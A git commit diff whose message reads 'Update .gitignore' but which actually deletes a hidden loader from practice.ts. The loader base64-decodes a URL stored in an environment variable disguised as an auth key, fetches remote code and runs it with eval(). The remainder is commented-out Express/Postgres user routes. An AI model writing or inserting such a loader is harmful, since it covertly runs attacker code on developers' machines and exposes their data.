fd41e84466dd75cf61823b24241f4b58bbfb9fdb
Md Ramjan Ali <gmramjanali100@gmail.com>
2026-05-17 02:49:57 +0600

    Update .gitignore

--- practice.ts
+++ practice.ts
@@ -1,50 +1,37 @@
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
-
-// app.post("/users", async (req: Request, res: Response) => {
-//   const { name, email, age, phone, address } = req.body;
-
-//   try {
-//     const result = await pool.query(
-//       `INSERT INTO users(name, email, age, phone, address) VALUES($1, $2 ,$3 , $4 , $5) RETURNING *`,
-//       [name, email, age, phone, address],
-//     );
-//     res.status(201).json({
-//       success: true,
-//       message: "User created successfully",
-//       data: result.rows[0],
-//     });
-//   } catch (error: any) {
-//     res.status(500).json({
-//       success: false,
-//       message: error.message,
-//     });
-//   }
-// });
-
-
-// app.get("/users", (req: Request, res: Response) => {
-//   pool.query(`SELECT * FROM users`, (error, results) => {
-//     if (error) {
-//       throw error;
-//     }
-//     res.status(200).json({
-//       success: true,
-//       messege: "User fetch successfully",
-//       data: results.rows,
-//     });
-//   });
+
+
+
+// app.post("/users", async (req: Request, res: Response) => {
+//   const { name, email, age, phone, address } = req.body;
+
+//   try {
+//     const result = await pool.query(
+//       `INSERT INTO users(name, email, age, phone, address) VALUES($1, $2 ,$3 , $4 , $5) RETURNING *`,
+//       [name, email, age, phone, address],
+//     );
+//     res.status(201).json({
+//       success: true,
+//       message: "User created successfully",
+//       data: result.rows[0],
+//     });
+//   } catch (error: any) {
+//     res.status(500).json({
+//       success: false,
+//       message: error.message,
+//     });
+//   }
+// });
+
+
+// app.get("/users", (req: Request, res: Response) => {
+//   pool.query(`SELECT * FROM users`, (error, results) => {
+//     if (error) {
+//       throw error;
+//     }
+//     res.status(200).json({
+//       success: true,
+//       messege: "User fetch successfully",
+//       data: results.rows,
+//     });
+//   });
 // });
